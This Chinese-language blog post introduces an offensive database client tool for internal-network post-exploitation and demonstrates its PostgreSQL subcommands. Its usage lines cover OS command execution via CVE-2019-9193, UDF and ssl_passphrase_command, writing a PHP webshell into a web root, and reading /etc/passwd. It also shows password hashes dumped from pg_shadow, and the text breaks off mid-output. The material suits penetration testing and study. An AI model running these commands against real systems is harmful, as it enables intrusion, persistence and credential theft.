---
title: 多组件客户端
url: https://mp.weixin.qq.com/s?__biz=Mzg2MDY2ODc5MA==&mid=2247484010&idx=1&sn=6face0aa268ccb988c6072b3a6d5a0ee&chksm=ce239473f9541d6575b912185cebe20f21c6e449edf320623affa0f53f2a317949fc6ac7f19b&scene=58&subscene=0#rd
source: 银针安全
date: 2024-09-10
fetch_date: 2025-10-06T18:32:09.629658
---

# 多组件客户端

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/HwHmjibphiaE0GHPyPa7ep1FLWbe2DnLk9cuwTia9Y10NYsZ6FQlAo64z0NGIWBHKpja8Zun4Nw9bVPXMCwbddhLQ/0?wx_fmt=jpeg)

# 多组件客户端

原创

Ape1ron

银针安全

* • 前言
* • 以PostgreSQL为例

+ • 交互式命令行
+ • 非交互式命令
+ • 自动化信息收集
+ • 文件写入

- • lo\_export
- • copy to

+ • 文件读取

- • lo\_import
- • pg\_read\_file
- • copy from

+ • 执行系统命令

- • CVE-2019-9193（copy from program）
- • UDF
- • ssl\_passphrase\_command

+ • 创建目录
+ • 列目录

* • 批量执行

+ • 执行模板
+ • 批量执行

# 前言

在内网经常会遇到各类数据库、中间件，但由于网络隔离、容器环境等各种因素影响，要在据点中得到一个可用的组件客户端有时候也并非轻易之举。此外，官方客户端也有可能不适配某些场景，例如所用C2是非交互式的，此时就很需要一个支持单行命令直接执行的工具。

笔者之前一般都是用官方的客户端，有时候遇到容器环境需要自行静态编译，遇到了非交互式的还用过expect脚本，到了真正能用上客户端时，又需要多个重复的动作来完成信息收集和漏洞利用。这对节能主义者来说是难以忍受的，于是就萌生过写一款工具来解决上述遇到的问题。

**工具特性**：

* **支持多个组件**：MySQL、PostgreSQL、Clickhouse、GaussDB、MongoDB、Redis、SSH、Elasticsearch
* 三大基础功能：

+ **交互式Shell**：交互式执行命令，类似一般官方客户端提供的能力
+ **非交互式执行**：直接在一行中完成命令执行
+ **信息收集**：批量执行一组预置命令，完成各个组件的基础信息收集

* 针对各个组件定制的特定功能，包括但不限于：**系统命令执行、文件读写**等，取决于组件本身支持的利用方式
* **批量执行**：通过模板文件来对一组目标批量执行命令
* 使用go开发，利用go交叉编译的特性，可以轻松编译出适配各种环境的可执行文件
* 详细的日志记录，便于复盘：）

注：上述的"命令"是指组件自身的命令，例如对于MySQL来说是SQL，而对于SSH来说则是系统命令。

**工具地址**：https://github.com/Ape1ron/davinci

下面通过PostgreSQL利用来介绍工具的使用。

# 以PostgreSQL为例

每个组件都对应了一个子命令，PostgreSQL对应pgsql

```
1. ┌──(root㉿kali)-[~/tools]
2. └─# ./davinci_linux_amd64 pgsql --help
3. pgsql client:
4. - exec:        execute the command once and return directly
5. - shell:       pgsql interactive shell
6. - auto_gather: automatically collect database information, including users, databases,
7. tables, table structures, and the first 5 rows of data for each table
8. - osshell:     exec os shell,three ways: [cve-2019-9193 | udf | ssl_passpharse]
9. - writefile:   write file,two ways: [lo_export | copy_to]
10. - readfile:    read file,three ways: [lo_import | pg_read | copy_from]
11. - mkdir:       create dir through log_directory,premise is logging_collector = on
12. - lsdir:       list dir through pg_ls_dir

14. Example:
15. davinci pgsql exec        -H 192.168.1.2 -P 5432 -u postgres -p 123456 -c "select user;"
16. davinci pgsql shell       -H 192.168.1.2 -P 5432 -u postgres -p 123456
17. davinci pgsql auto_gather -H 192.168.1.2 -P 5432 -u postgres -p 123456
18. davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --cve-2019-9193
19. davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --cve-2019-9193 --no-interactive -c "whoami"
20. davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --udf
21. davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --udf --no-interactive -c "whoami"
22. davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --ssl_passpharse -c "whoami"
23. davinci pgsql writefile   -H 192.168.1.2 -P 5432 -u postgres -p 123456 --lo_export -s ./eval.php -t /var/www/html/1.php
24. davinci pgsql writefile   -H 192.168.1.2 -P 5432 -u postgres -p 123456 --copy_to -C "<?php phpinfo(); ?>" -t /var/www/html/1.php
25. davinci pgsql readfile    -H 192.168.1.2 -P 5432 -u postgres -p 123456 --lo_import -t /etc/passwd
26. davinci pgsql readfile    -H 192.168.1.2 -P 5432 -u postgres -p 123456 --pg_read -t /etc/passwd
27. davinci pgsql readfile    -H 192.168.1.2 -P 5432 -u postgres -p 123456 --copy_from -t /etc/passwd --hex
28. davinci pgsql mkdir       -H 192.168.1.2 -P 5432 -u postgres -p 123456 -t /etc/pg_dir
29. davinci pgsql lsdir       -H 192.168.1.2 -P 5432 -u postgres -p 123456 -t /

31. Usage:
32. davinci pgsql [exec|shell|auto_gather|osshell|writefile|readfile|mkdir|lsdir] [flags]

34. Flags:
35. -c, --cmd string       cmd to be executed, used in exec(sql) and osshell(shell) mode
36. -C, --content string   [write] write content to target,use for write file mode,choose one of content and source
37. --copy_from        [read] use copy from to readfile
38. --copy_to          [write] use 'copy to' to readfile
39. --cve-2019-9193    [osshell] use cve-2019-9193(copy from program) to exec,support version>=9.3
40. -d, --dbName string    database name,not require
41. -h, --help             help for pgsql
42. --hex              [write/read] encode write/read file content
43. -H, --host string      pgsql ip addr (default "127.0.0.1")
44. --lo_export        [write] use lo_export to readfile
45. --lo_import        [read] use lo_import to readfile
46. --no-interactive   no-interactive with os shell
47. -p, --passwd string    pasword
48. --pg_read          [read] use pg_read to readfile
49. -P, --port int         pgsql port (default 5432)
50. -s, --source string    [write] (local)  source file path,use for write file mode
51. --ssl_passpharse   [osshell] use pgconfig ssl passpharse to exec,support version>=11
52. -t, --target string    [write/read] (remote) target file path,use for write/read file mode
53. --udf              [osshell] use udf to exec
54. -u, --user string      username (default "postgres")

56. Global Flags:
57. --no-log   not log to file
58. --silent   close info level output
```

## 交互式命令行

```
1. ┌──(root㉿kali)-[~/tools]
2. └─# ./davinci pgsql shell  -H 192.168.83.129 -P 5432 -p 123456
3. > select version()
4. 2024/09/07 09:35:15 [info] execute sql: select version()
5. +--------------------------------+
6. |            VERSION             |
7. +--------------------------------+
8. | PostgreSQL 16.4 (Debian        |
9. | 16.4-1.pgdg120+1) on           |
10. | x86_64-pc-linux-gnu, compiled  |
11. | by gcc (Debian 12.2.0-14)      |
12. | 12.2.0, 64-bit                 |
13. +--------------------------------+
14. > exit
```

## 非交互式命令

```
1. ┌──(root㉿kali)-[~/tools]
2. └─# ./davinci pgsql exec  -H 192.168.83.129 -P 5432 -p 123456 -c "select version()"
3. 2024/09/07 09:36:27 [info] execute sql: select version()
4. +--------------------------------+
5. |            VERSION             |
6. +--------------------------------+
7. | PostgreSQL 16.4 (Debian        |
8. | 16.4-1.pgdg120+1) on           |
9. | x86_64-pc-linux-gnu, compiled  |
10. | by gcc (Debian 12.2.0-14)      |
11. | 12.2.0, 64-bit                 |
12. +--------------------------------+
```

## 自动化信息收集

收集逻辑如下：

* 获取版本信息
* 获取数据库用户列表
* 获取数据库支持的编程语言列表(pg\_language)
* 获取database列表
* 遍历database获取所有schema（自动排除自带的database）
* 遍历所有schema获取所有table（自动排除自带的schemas）
* 获取每个table的结构，数据量以及前5行数据
* 获取所有扩展列表（pgavailableextensions）
* 获取数据库配置（pg\_settings）

使用方式

```
1. ┌──(root㉿kali)-[~/tools]
2. └─# ./davinci pgsql auto_gather  -H 192.168.83.129 -P 5432 -p 123456
3. 2024/09/07 09:45:54 [info] get version
4. 2024/09/07 09:45:54 [info] execute sql: select version();
5. +--------------------------------+
6. |            VERSION             |
7. +--------------------------------+
8. | PostgreSQL 16.4 (Debian        |
9. | 16.4-1.pgdg120+1) on           |
10. | x86_64-pc-linux-gnu, compiled  |
11. | by gcc (Debian 12.2.0-14)      |
12. | 12.2.0, 64-bit                 |
13. +--------------------------------+
14. 2024/09/07 09:45:54 [info] get users
15. 2024/09/07 09:45:54 [info] execute sql: SELECT usename,passwd FROM pg_shadow;
16. +----------+---------------------------------------------------------------------------------------------------------------------------------------+
17. | USENAME  |                                                                PASSWD                                                                 |
18. +----------+---------------------------------------------------------------------------------------------------------------------------------------+
19. | postgres | SCRAM-SHA-256$4096:IgY4gbZGYJm+Izbd5oY/Sg==$mImJT90qIRjmncKZUF6AdNcPHrReGcQlx/jSviY4r0w=:tPjBnjvHwBErOD8XsO/XANg4t6np9BgmxC/DrG7k0kc= |
20. +----------+---------------------------------------------------------------------------------------------------------------------------------------+
21. 2024/09/07 09:45:54 [info] get pg_language
22. 2024/09/07 09:45:54 [info] execute sql: select * from pg_language
23. +-------+----------+----------+---------+--------------+---------------+-----------+---------...